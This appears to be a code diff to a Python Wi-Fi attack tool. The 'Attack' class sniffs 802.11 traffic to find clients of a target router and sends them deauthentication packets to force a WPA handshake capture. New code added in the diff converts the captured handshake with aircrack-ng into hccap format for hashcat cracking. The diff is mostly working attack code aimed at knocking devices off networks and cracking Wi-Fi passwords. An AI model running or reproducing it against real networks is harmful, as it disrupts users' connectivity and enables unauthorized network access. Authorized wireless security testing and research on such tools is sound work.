@@ -24,41 +24,48 @@ class Attack(object):
 		# starting handshake verifier
 		self.verifier = RepeatTimer(1,self.verify_Handshake)
 		self.verifier.start()
+
+
+
 	def start(self):
 		t = AsyncSniffer(prn=self.find_clients, iface=self.interface)
 		t.start()
-		
-		
 		self.search_client()
-		self.hs.terminate()
+
+		# if the above loop ended, then close everything
+		self.hs.terminate() #terminate hash capture
 		self.hs.join()
-		self.verifier.cancel()
-		t.stop()
+		self.verifier.cancel() # cancel handshake verifier
+		t.stop() # stop the deauther
+		raise KeyboardInterrupt
+
 
 	def search_client(self):
 		print(colors.O + "[-]" + colors.W +" Total clients: "+colors.GR+ str(len(self.clients)) + colors.W)
 		print(colors.O + "[+]" + colors.W + " Searching for clients...")
 		timeout = time.time() + 60*2
+
 		while self.hasHandshake == False and time.time() < timeout:
 			time.sleep(8)
 			if( len(self.clients) != 0 ):
 				print(colors.B + "[+]" + colors.W +" Found client ")
 				self.deauth_clients()
 				
-
 		if(self.hasHandshake):
-			print(colors.BOLD+colors.B + "[+]" + colors.W +" Captured handshake successfully!")
+			print(colors.BOLD+colors.O + "[+]" + colors.W +colors.BOLD+" Captured handshake successfully!" + colors.W)
 			return ''
 		else:
 			print(colors.O + "[-]" + colors.W + " Timeout")
 			return ''
+
+
 
 	def deauth_clients(self):
 	
 		if(len(self.clients) != 0):
 			print(colors.O + "[+]" + colors.W + " Sending Deauth packet to: ", end=' ')
 			for i in self.clients:
-				print(colors.BOLD+colors.GR + str(i).upper() + colors.W,end="\r")
+				print(colors.BOLD+colors.GR + str(i).upper() + colors.W,end=" ")
 				self.deauth(i)
 	
 
@@ -74,11 +81,12 @@ class Attack(object):
 		sendp(packet, iface=self.interface,count=5)
 		
 	
+
 	def find_clients(self,p):
 		if p.haslayer(Dot11):
 			if p.addr1 and p.addr2:                  # if "from" and "to" mac addr. exists
-				p.addr1 = p.addr1.lower()            # convert both macs to all lower case     
-				p.addr2 = p.addr2.lower()         
+				p.addr1 = p.addr1.lower()   # router mac         # convert both macs to all lower case     
+				p.addr2 = p.addr2.lower()   # client mac      
 				if self.targetRouterMac.lower() == p.addr1.lower(): # AP's mac address = packt destination mac !
 					if p.type in [1, 2]:             # the type I'm looking for
 						if p.addr2 not in self.clients and p.addr2 != '':
@@ -98,22 +106,22 @@ class Attack(object):
 		if(os.path.exists(file)):
 			v = checkHandshake(os.path.join(self.dir,file))
 			self.hasHandshake = v.verify()
+			if(self.hasHandshake):
+				time.sleep(1)
+				self.convert_cap_hccap()
 
-	def send_interrupt(process):
-		"""
-        Sends interrupt signal to process's PID.
-		"""
+
+	def convert_cap_hccap(self):
+		# hashcat is much faster for cracking
 		try:
-			os.kill(process.pid, SIGINT)
-	        # os.kill(process.pid, SIGTERM)
-		except OSError:
-			pass  # process cannot be killed
-		except TypeError:
-			pass  # pid is incorrect type
-		except UnboundLocalError:
-			pass  # 'process' is not defined
-		except AttributeError:
-			pass  # Trying to kill "None"
+			file = glob("capture*.cap")[0]
+			cmd = f"aircrack-ng -J {self.targetRouterMac}_hs {os.path.join(self.dir,file)}"
+			print(colors.O + "[+]" + colors.W + " Coverting pcap to hccap for cracking.")
+			subprocess.call(cmd,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+			print(colors.O + "[+]" + colors.W + f" Saved to {self.targetRouterMac}_hs.hccap")
+		except:
+			pass
+
 
 
 class RepeatTimer(Timer):
